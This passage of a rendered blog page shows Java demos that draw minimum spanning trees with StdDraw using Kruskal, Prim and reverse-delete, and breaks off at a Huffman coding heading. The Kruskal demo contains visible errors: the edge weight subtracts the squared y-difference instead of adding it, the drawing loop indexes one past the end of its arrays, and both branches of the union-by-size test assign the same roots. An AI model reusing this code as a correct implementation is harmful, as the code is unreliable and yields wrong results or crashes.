class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Arrays;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">KruskalDemo2</span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] arrays)</span>{<br>        <span class="hljs-type">int</span> VN=<span class="hljs-number">9</span>,eN=<span class="hljs-number">17</span>,count;<br>        count=VN;<br>        <span class="hljs-type">int</span>[] cN=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[VN];<br>        <span class="hljs-type">int</span>[] cS=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[VN];<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;VN;i++){<br>            cN[i]=i;<br>            cS[i]=<span class="hljs-number">1</span>;<br>        }<br>        <span class="hljs-type">int</span>[] c=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[eN];<br>        <span class="hljs-type">int</span>[] c2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[eN];<br>        <span class="hljs-type">int</span>[] flagEOG=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[eN];<br>        <span class="hljs-type">int</span>[][]<br>                e={{<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>},{<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">4</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">4</span>,<span class="hljs-number">8</span>,<span class="hljs-number">7</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">8</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">8</span>}};<br>        <span class="hljs-type">int</span> N=VN;<br>        <span class="hljs-type">int</span> beishu=<span class="hljs-number">9</span>;<br>        <span class="hljs-type">int</span>[] x={<span class="hljs-number">4</span>,<span class="hljs-number">1</span>,<span class="hljs-number">7</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">8</span>,<span class="hljs-number">1</span>,<span class="hljs-number">6</span>,<span class="hljs-number">3</span>};<br>        <span class="hljs-type">int</span>[] y={<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">4</span>,<span class="hljs-number">6</span>,<span class="hljs-number">6</span>,<span class="hljs-number">8</span>};<br>        StdDraw.setXscale(<span class="hljs-number">0</span>,beishu);<br>        StdDraw.setYscale(<span class="hljs-number">0</span>,beishu);<br>        StdDraw.setPenRadius(<span class="hljs-number">0.005</span>);<br>        <span class="hljs-type">int</span> v3;<br>        <span class="hljs-type">int</span> v4;<br>        <span class="hljs-type">int</span>[][] e2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">2</span>][eN];<br>        <span class="hljs-type">int</span>[] flagX=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[eN];<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;eN;i++)<br>        {<br>            v3=e[<span class="hljs-number">0</span>][i];<br>            v4=e[<span class="hljs-number">1</span>][i];<br>            flagX[i]=<span class="hljs-number">1</span>;<br>            c[i]=(x[v3]-x[v4])*(x[v3]-x[v4])-(y[v3]-y[v4])*(y[v3]-y[v4]);<br>            c2[i]=c[i];<br>            flagEOG[i]=<span class="hljs-number">0</span>;<br>        }<br>        Arrays.sort(c);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;eN;i++){<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;eN;j++){<br>                <span class="hljs-keyword">if</span>(c[i]==c2[j]&amp;&amp;flagX[j]==<span class="hljs-number">1</span>){<br>                    e2[<span class="hljs-number">0</span>][i]=e[<span class="hljs-number">0</span>][j];<br>                    e2[<span class="hljs-number">1</span>][i]=e[<span class="hljs-number">1</span>][j];<br>                    flagX[j]=<span class="hljs-number">0</span>;<br>                    <span class="hljs-keyword">break</span>;<br>                }<br>            }<br>        }<br>        <span class="hljs-type">int</span> clb=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> (count&gt;=<span class="hljs-number">1</span>){<br>            <span class="hljs-keyword">if</span> (count==<span class="hljs-number">1</span>){<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;=eN;i++){<br>                    <span class="hljs-type">int</span> v1,v2;<br>                    v1=e2[<span class="hljs-number">0</span>][i];<br>                    v2=e2[<span class="hljs-number">1</span>][i];<br>                    <span class="hljs-keyword">if</span>(flagEOG[i]==<span class="hljs-number">1</span>){<br>                        StdDraw.setPenColor(StdDraw.RED);<br>                        StdDraw.line(x[v1],y[v1],x[v2],y[v2]);<br>                    }<br>                    <span class="hljs-keyword">else</span>{<br>                        StdDraw.setPenColor(StdDraw.BLACK);<br>                        StdDraw.line(x[v1],y[v1],x[v2],y[v2]);<br>                    }<br>                }<br>                <span class="hljs-keyword">break</span>;<br>            }<br>            <span class="hljs-type">int</span> szj1,szj2;<br>            szj1=cN[e2[<span class="hljs-number">0</span>][clb]];<br>            szj2=cN[e2[<span class="hljs-number">1</span>][clb]];<br>            <span class="hljs-keyword">if</span>(szj1!=szj2){<br>                flagEOG[clb]=<span class="hljs-number">1</span>;<br>                count=count-<span class="hljs-number">1</span>;<br>                <span class="hljs-type">int</span> dd,xd;<br>                <span class="hljs-keyword">if</span> (cS[szj1]&gt;=cS[szj2]){<br>                    dd=szj1;<br>                    xd=szj2;<br>                }<br>                <span class="hljs-keyword">else</span> {<br>                    dd=szj1;<br>                    xd=szj2;<br>                }<br>                <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k=<span class="hljs-number">0</span>;k&lt;VN;k++){<br>                    <span class="hljs-keyword">if</span>(cN[k]==dd){<br>                        cS[dd]=cS[dd]+cS[xd];<br>                    }<br>                }<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k=<span class="hljs-number">0</span>;k&lt;VN;k++){<br>                    <span class="hljs-keyword">if</span>(cN[k]==xd){<br>                        cN[k]=dd;<br>                    }<br>                }<br>            }<br>            clb=clb+<span class="hljs-number">1</span>;<br>        }<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><h4 id="prim"><a href="#prim" class="headerlink" title="prim"></a>prim</h4><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Arrays;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PrimDemo</span> {<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {<br>        <span class="hljs-type">int</span> vN=<span class="hljs-number">9</span>,eN=<span class="hljs-number">17</span>,count;<br>        count = vN;<br>        <span class="hljs-type">int</span>[] cN=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[vN];<br>        <span class="hljs-type">int</span>[] cS=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[vN];<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;vN;i++){<br>            cN[i]=i;<br>            cS[i]=<span class="hljs-number">1</span>;<br>        }<br>        <span class="hljs-type">int</span>[] c=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[eN];<br>        <span class="hljs-type">int</span>[] c2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[eN];<br>        <span class="hljs-type">int</span>[] flagEOG=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[eN];<br>        <span class="hljs-type">int</span>[] flagVOG=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[vN];<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;vN;i++){<br>            flagVOG[i]=<span class="hljs-number">0</span>;<br>        }<br>        <span class="hljs-type">int</span>[][] e ={{<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>},{<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">4</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">4</span>,<span class="hljs-number">8</span>,<span class="hljs-number">7</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">8</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">8</span>}};<br>        <span class="hljs-type">int</span> N=vN;<br>        <span class="hljs-type">int</span> beishu=<span class="hljs-number">9</span>;<br>        <span class="hljs-type">int</span>[] x={<span class="hljs-number">4</span>,<span class="hljs-number">1</span>,<span class="hljs-number">7</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">8</span>,<span class="hljs-number">1</span>,<span class="hljs-number">6</span>,<span class="hljs-number">3</span>};<br>        <span class="hljs-type">int</span>[] y={<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">4</span>,<span class="hljs-number">6</span>,<span class="hljs-number">6</span>,<span class="hljs-number">8</span>};<br>        StdDraw.setXscale(<span class="hljs-number">0</span>,beishu);<br>        StdDraw.setYscale(<span class="hljs-number">0</span>,beishu);<br>        StdDraw.setPenRadius(<span class="hljs-number">0.005</span>);<br>        <span class="hljs-type">int</span> v3;<br>        <span class="hljs-type">int</span> v4;<br>        <span class="hljs-type">int</span>[][] e2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">2</span>][eN];<br>        <span class="hljs-type">int</span>[] flagX=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[eN];<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;eN;i++){<br>            v3=e[<span class="hljs-number">0</span>][i];<br>            v4=e[<span class="hljs-number">1</span>][i];<br>            flagX[i]=<span class="hljs-number">1</span>;<br>            c[i]=(x[v3]-x[v4])*(x[v3]-x[v4])+(y[v3]-y[v4])*(y[v3]-y[v4]);<br>            c2[i]=c[i];<br>            flagEOG[i]=<span class="hljs-number">0</span>;<br>        }<br>        Arrays.sort(c);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;eN;i++){<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;eN;j++){<br>                <span class="hljs-keyword">if</span>(c[i]==c2[j]&amp;&amp;flagX[j]==<span class="hljs-number">1</span>){<br>                    e2[<span class="hljs-number">0</span>][i]=e[<span class="hljs-number">0</span>][j];<br>                    e2[<span class="hljs-number">1</span>][i]=e[<span class="hljs-number">1</span>][j];<br>                    flagX[j]=<span class="hljs-number">0</span>;<br>                    <span class="hljs-keyword">break</span>;<br>                }<br>            }<br>        }<br>        <span class="hljs-type">int</span> fV=(<span class="hljs-type">int</span>)(Math.random()*vN);<br>        flagVOG[fV]=<span class="hljs-number">1</span>;<br>        <span class="hljs-type">int</span> szj1,szj2;<br>        <span class="hljs-keyword">while</span> (count&gt;=<span class="hljs-number">1</span>){<br>            <span class="hljs-keyword">if</span>(count==<span class="hljs-number">1</span>){<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;eN;i++){<br>                    <span class="hljs-type">int</span> v1,v2;<br>                    v1=e2[<span class="hljs-number">0</span>][i];<br>                    v2=e2[<span class="hljs-number">1</span>][i];<br><br>                    <span class="hljs-keyword">if</span>(flagEOG[i]==<span class="hljs-number">1</span>){<br>                        StdDraw.setPenColor(StdDraw.RED);<br>                        StdDraw.line(x[v1],y[v1],x[v2],y[v2]);<br>                    }<br>                    <span class="hljs-keyword">else</span> {<br>                        StdDraw.setPenColor(StdDraw.BLACK);<br>                        StdDraw.line(x[v1],y[v1],x[v2],y[v2]);<br>                    }<br>                }<br>                <span class="hljs-keyword">break</span>;<br>            }<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k=<span class="hljs-number">0</span>;k&lt;eN;k++){<br>                szj1=e2[<span class="hljs-number">0</span>][k];<br>                szj2=e2[<span class="hljs-number">1</span>][k];<br>                <span class="hljs-keyword">if</span>(flagEOG[k]==<span class="hljs-number">0</span>&amp;&amp;((flagVOG[szj2]==<span class="hljs-number">0</span>&amp;&amp;flagVOG[szj1]==<span class="hljs-number">1</span>)||(flagVOG[szj2]==<span class="hljs-number">1</span>&amp;&amp;flagVOG[szj1]==<span class="hljs-number">0</span>))){<br>                    flagEOG[k]=<span class="hljs-number">1</span>;<br>                    <span class="hljs-keyword">if</span>(flagVOG[szj2]==<span class="hljs-number">0</span>){<br>                        flagVOG[szj2]=<span class="hljs-number">1</span>;<br>                    }<br>                    <span class="hljs-keyword">else</span> {<br>                        flagVOG[szj1]=<span class="hljs-number">1</span>;<br>                    }<br>                    count--;<br>                    <span class="hljs-keyword">break</span>;<br>                }<br>            }<br>        }<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><h4 id="反向删除"><a href="#反向删除" class="headerlink" title="反向删除"></a>反向删除</h4><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Arrays;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReverseDeleteDemo</span> {<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {<br>        <span class="hljs-type">int</span> <span class="hljs-variable">vN</span> <span class="hljs-operator">=</span> <span class="hljs-number">9</span>, eN = <span class="hljs-number">17</span>, count;<br>        count = vN;<br>        <span class="hljs-type">int</span>[] c = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[eN];<br>        <span class="hljs-type">int</span>[] flagv = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[vN];<br>        <span class="hljs-type">int</span>[] c2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[eN];<br>        <span class="hljs-type">int</span>[] flagEOG = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[eN];<br>        <span class="hljs-type">int</span>[][] e = {{<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>}, {<span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">7</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">8</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>}};<br>        <span class="hljs-type">int</span>[][] flag = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[vN][vN];<br>        <span class="hljs-type">int</span> <span class="hljs-variable">N</span> <span class="hljs-operator">=</span> vN;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">beishu</span> <span class="hljs-operator">=</span> <span class="hljs-number">9</span>;<br>        <span class="hljs-type">int</span>[] x = {<span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-number">7</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">3</span>};<br>        <span class="hljs-type">int</span>[] y = {<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>, <span class="hljs-number">6</span>, <span class="hljs-number">8</span>};<br>        StdDraw.setXscale(<span class="hljs-number">0</span>, beishu);<br>        StdDraw.setYscale(<span class="hljs-number">0</span>, beishu);<br>        StdDraw.setPenRadius(<span class="hljs-number">0.005</span>);<br>        <span class="hljs-type">int</span> v3;<br>        <span class="hljs-type">int</span> v4;<br>        <span class="hljs-type">int</span>[][] e2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">2</span>][eN];<br>        <span class="hljs-type">int</span>[] flagX = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[eN];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; eN; i++) {<br>            v3 = e[<span class="hljs-number">0</span>][i];<br>            v4 = e[<span class="hljs-number">1</span>][i];<br>            flagX[i] = <span class="hljs-number">1</span>;<br>            c[i] = (x[v3] - x[v4]) * (x[v3] - x[v4]) + (y[v3] - y[v4]) * (y[v3] - y[v4]);<br>            c2[i] = c[i];<br>            flagEOG[i] = <span class="hljs-number">1</span>;<br>        }<br>        Arrays.sort(c);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; eN; i++) {<br>            flag[e[<span class="hljs-number">0</span>][i]][e[<span class="hljs-number">1</span>][i]] = <span class="hljs-number">1</span>;<br>            flag[e[<span class="hljs-number">1</span>][i]][e[<span class="hljs-number">0</span>][i]] = <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; j &lt; eN; j++) {<br>                <span class="hljs-keyword">if</span> (c[i] == c2[j] &amp;&amp; flagX[j] == <span class="hljs-number">1</span>) {<br>                    e2[<span class="hljs-number">0</span>][i] = e[<span class="hljs-number">0</span>][j];<br>                    e2[<span class="hljs-number">1</span>][i] = e[<span class="hljs-number">1</span>][j];<br>                    flagX[j] = <span class="hljs-number">0</span>;<br>                    <span class="hljs-keyword">break</span>;<br>                }<br>            }<br>        }<br>        <span class="hljs-type">int</span> szj1, szj2;<br>        <span class="hljs-keyword">while</span> (count &gt;= <span class="hljs-number">1</span>) {<br>            <span class="hljs-keyword">if</span> (count == <span class="hljs-number">1</span>) {<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; eN; i++) {<br>                    <span class="hljs-type">int</span> v1, v2;<br>                    v1 = e2[<span class="hljs-number">0</span>][i];<br>                    v2 = e2[<span class="hljs-number">1</span>][i];<br>                    <span class="hljs-keyword">if</span> (flagEOG[i] == <span class="hljs-number">1</span>) {<br>                        StdDraw.setPenColor(StdDraw.RED);<br>                        StdDraw.line(x[v1], y[v1], x[v2], y[v2]);<br>                    } <span class="hljs-keyword">else</span> {<br>                        StdDraw.setPenColor(StdDraw.BLACK);<br>                        StdDraw.line(x[v1], y[v1], x[v2], y[v2]);<br>                    }<br>                }<br>                <span class="hljs-keyword">break</span>;<br>            }<br>            <span class="hljs-type">int</span> <span class="hljs-variable">cmN</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">k</span> <span class="hljs-operator">=</span> eN - <span class="hljs-number">1</span>; k &gt;= <span class="hljs-number">0</span>; k--) {<br>                szj1 = e2[<span class="hljs-number">0</span>][k];<br>                szj2 = e2[<span class="hljs-number">1</span>][k];<br>                flag[szj1][szj2] = <span class="hljs-number">0</span>;<br>                flag[szj2][szj1] = <span class="hljs-number">0</span>;<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; vN; i++) {<br>                    flagv[i] = <span class="hljs-number">1</span>;<br>                }<br>                cmN = dft(szj1, flag, flagv, vN);<br>                <span class="hljs-keyword">if</span> (cmN == vN) {<br>                    flagEOG[k] = <span class="hljs-number">0</span>;<br>                } <span class="hljs-keyword">else</span> {<br>                    flag[szj1][szj2] = <span class="hljs-number">1</span>;<br>                    flag[szj2][szj1] = <span class="hljs-number">1</span>;<br>                }<br>            }<br>            count = <span class="hljs-number">1</span>;<br>        }<br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">dft</span><span class="hljs-params">(<span class="hljs-type">int</span> v, <span class="hljs-type">int</span>[][] flag, <span class="hljs-type">int</span>[] flagv, <span class="hljs-type">int</span> vN)</span> {<br>        <span class="hljs-type">int</span> count=<span class="hljs-number">1</span>;<br>        flagv[v]=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;vN;i++){<br>            <span class="hljs-keyword">if</span>(flag[v][i]==<span class="hljs-number">1</span>&amp;&amp;flagv[i]==<span class="hljs-number">1</span>){<br>                count=count+dft(i,flag,flagv,vN);<br>            }<br>        }<br>        <span class="hljs-keyword">return</span> count;<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><h2 id="第四章"><a href="#第四章" class="headerlink" title="第四章"></a>第四章</h2><h3 id="哈夫曼编码"><a href="#哈夫曼编码" class="headerlink" title="哈夫曼编码"></a>哈夫曼编码</h3><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 